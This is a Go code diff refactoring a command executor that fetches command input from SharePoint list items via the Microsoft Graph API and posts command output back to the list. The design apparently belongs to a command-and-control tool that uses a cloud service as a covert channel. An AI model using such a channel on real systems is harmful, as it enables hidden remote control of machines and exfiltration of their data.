@@ -15,14 +15,13 @@ type MicrosoftCommandExecutor struct {
 	microsoftSiteID string
 	microsoftListID MicrosoftListId
 	listStartID     int
-	commands        []*Command
 }
 
 func NewMicrosoftCommandExecutor(client *MicrosoftConnector) (*MicrosoftCommandExecutor, error) {
 	microsoftCommandExecutor := &MicrosoftCommandExecutor{
 		client:          client,
 		microsoftSiteID: configuration.GetOptionsMicrosoftSiteID(),
-		listStartID:     configuration.GetRowId(),
+		listStartID:     configuration.GetSourceFirstCommandIndex(),
 	}
 
 	listID, err := createMicrosoftList(microsoftCommandExecutor)
@@ -122,8 +121,8 @@ type ListItem struct {
 	ListItemFields Fields `json:"fields"`
 }
 
-func (m *MicrosoftCommandExecutor) pullCommandAndTicker() (string, int, error) {
-	itemID := strconv.Itoa(m.getLastCommand().RowId)
+func (m *MicrosoftCommandExecutor) pullCommandAndTicker(itemIndex int) (string, int, error) {
+	itemID := strconv.Itoa(itemIndex)
 	url := fmt.Sprintf(
 		"https://graph.microsoft.com/v1.0/sites/%s/lists/%s/items/%s",
 		m.microsoftSiteID,
@@ -161,12 +160,11 @@ func (m *MicrosoftCommandExecutor) pullCommandAndTicker() (string, int, error) {
 	return item.ListItemFields.Input, ticker, nil
 }
 
-// Push configuration.Command output to remote list
-func (m *MicrosoftCommandExecutor) pushOutput(lastCommand *Command) error {
-	itemID := strconv.Itoa(lastCommand.RowId)
+func (m *MicrosoftCommandExecutor) pushOutput(itemIndex int, commandOutput string) error {
+	itemID := strconv.Itoa(itemIndex)
 
 	fields := Fields{
-		Output: lastCommand.Output,
+		Output: commandOutput,
 		Log:    utils.GetCurrentDate(),
 	}
 
@@ -195,25 +193,4 @@ func (m *MicrosoftCommandExecutor) pushOutput(lastCommand *Command) error {
 	}
 
 	return nil
-}
-
-func (m *MicrosoftCommandExecutor) appendEmptyCommand() {
-	var rowId int
-
-	last := m.getLastCommand()
-	if last == nil {
-		rowId = configuration.GetRowId()
-	} else {
-		rowId = last.RowId + 1
-	}
-
-	m.commands = append(m.commands, NewCommand(rowId))
-}
-
-func (m *MicrosoftCommandExecutor) getLastCommand() *Command {
-	if len(m.commands) == 0 {
-		return nil
-	}
-
-	return m.commands[len(m.commands)-1]
 }
